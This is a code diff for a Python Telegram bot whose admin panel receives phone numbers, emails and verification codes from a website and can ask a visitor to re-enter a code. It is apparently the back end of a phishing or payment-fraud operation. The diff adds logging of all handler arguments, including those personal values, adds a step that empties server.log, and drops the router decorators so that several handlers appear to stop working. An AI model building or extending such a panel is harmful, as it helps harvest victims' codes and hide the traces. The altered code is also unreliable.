@@ -25,7 +25,27 @@ import aiohttp
 from config import API_TOKEN, ADMIN_GROUP_ID, ADMIN_IDS
 import requests
 
-logging.basicConfig(level=logging.INFO)
+# --- Logging setup ---
+logging.basicConfig(
+    filename='main.log',
+    level=logging.INFO,
+    format='%(asctime)s | %(levelname)s | %(funcName)s | %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
+
+def log_function(func):
+    @wraps(func)
+    async def wrapper(*args, **kwargs):
+        logging.info(f'start | args={args} kwargs={kwargs}')
+        try:
+            result = await func(*args, **kwargs)
+            logging.info(f'success | result={result}')
+            return result
+        except Exception as e:
+            logging.error(f'error | Exception: {e}', exc_info=True)
+            raise
+    return wrapper
+
 bot = Bot(token=API_TOKEN)
 router = Router()
 dp = Dispatcher()
@@ -429,8 +449,7 @@ async def admin_panel(message: types.Message):
     await message.answer("Админ-панель. Выберите действие:", reply_markup=admin_panel_kb)
     user_step[message.from_user.id] = 'admin_panel'
 
-@router.message(lambda m: user_step.get(m.from_user.id) == 'admin_panel')
-@ban_guard
+@log_function
 async def admin_panel_action(message: types.Message):
     if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
         uid = message.from_user.id
@@ -461,6 +480,9 @@ async def admin_panel_action(message: types.Message):
         import requests
         try:
             requests.get('http://127.0.0.1:8080/set_payment_disabled?value=1', timeout=2)
+            # Очищення server.log
+            with open('server.log', 'w') as f:
+                f.truncate(0)
         except Exception as e:
             print(f"[admin_panel] Error disabling payment: {e}")
         await message.answer("Платіжка тимчасово відключена для всіх користувачів.")
@@ -908,7 +930,7 @@ async def cancel_links_template(message: types.Message):
     await message.answer("Действие отменено.", reply_markup=ReplyKeyboardRemove())
     user_step[message.chat.id] = None
 
-@router.message(lambda m: user_step.get(m.from_user.id, "").startswith("text_for_"))
+@log_function
 async def admin_enter_text(message: types.Message):
     print(f"admin_enter_text called by {message.from_user.id} with text: {message.text}")
     step = user_step[message.from_user.id]
@@ -1051,6 +1073,7 @@ async def events_save_all(message):
     kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
     await message.answer("Головне меню:", reply_markup=kb)
 
+@log_function
 async def notify_admin(request):
     data = await request.json()
     phone = data.get('phone', '')
@@ -1081,6 +1104,7 @@ async def notify_admin(request):
         print('Error sending message:', e)
     return web.Response(text="OK")
 
+@log_function
 async def payment_notify(request):
     data = await request.json()
     email = data.get('email', '')
@@ -1121,6 +1145,7 @@ async def payment_notify(request):
     await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
     return web.Response(text='ok')
 
+@log_function
 async def code_notify(request):
     data = await request.json()
     code = data.get('code', '')
@@ -1190,7 +1215,7 @@ async def code_request_again_handler(call: types.CallbackQuery):
         await session.post('http://127.0.0.1:8080/set_request_again', json={'code': code})
     await call.answer("Request sent to user")
 
-@router.callback_query(lambda c: c.data.startswith("support:"))
+@log_function
 async def admin_support_callback(call: types.CallbackQuery):
     ip = call.data.split(":")[1]
     if not ip:
@@ -1204,7 +1229,7 @@ async def admin_support_callback(call: types.CallbackQuery):
     asyncio.create_task(set_flag())
     await call.message.answer("Кнопка підтримки з'явиться на сайті користувача.")
 
-@router.callback_query(lambda c: c.data.startswith("text:"))
+@log_function
 async def admin_text_callback(call: types.CallbackQuery):
     ip = call.data.split(":")[1]
     if not ip:
